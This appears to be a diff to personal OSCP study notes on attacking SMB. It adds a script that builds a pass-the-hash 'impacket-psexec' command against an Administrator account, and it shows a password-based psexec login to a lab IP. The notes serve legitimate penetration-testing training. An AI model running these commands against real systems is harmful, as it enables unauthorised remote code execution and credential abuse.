@@ -1,6 +1,18 @@
 To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:
 
   Attacking SMB
+  
+Pass the hash psexec
+
+FULL HASH LMHASH:NTHASH
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-psexec ${discoveredDomain}/Administrator@${ip} -hashes [hash]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 
 ```shell-session
 Retric@htb[/htb]$ impacket-psexec -h
@@ -53,6 +65,9 @@ To connect to a remote machine with a local administrator account, using `impac
 
 ```shell-session
 Retric@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
+```
+
+```
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
